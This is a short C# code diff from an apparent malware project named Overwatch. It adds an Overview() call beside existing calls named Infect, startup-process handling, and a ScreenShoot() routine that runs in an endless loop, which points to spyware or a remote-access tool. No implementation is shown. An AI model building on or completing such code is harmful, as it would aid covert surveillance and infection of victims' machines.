@@ -17,6 +17,7 @@ namespace Overwatch
                 cStartupOptions.ProcessStartInfo();
                 cChangeLabel.Infect(args);
                 cReceiveInformation info = new cReceiveInformation();
+                info.Overview();
                 while (true)
                 {
                     info.ScreenShoot();
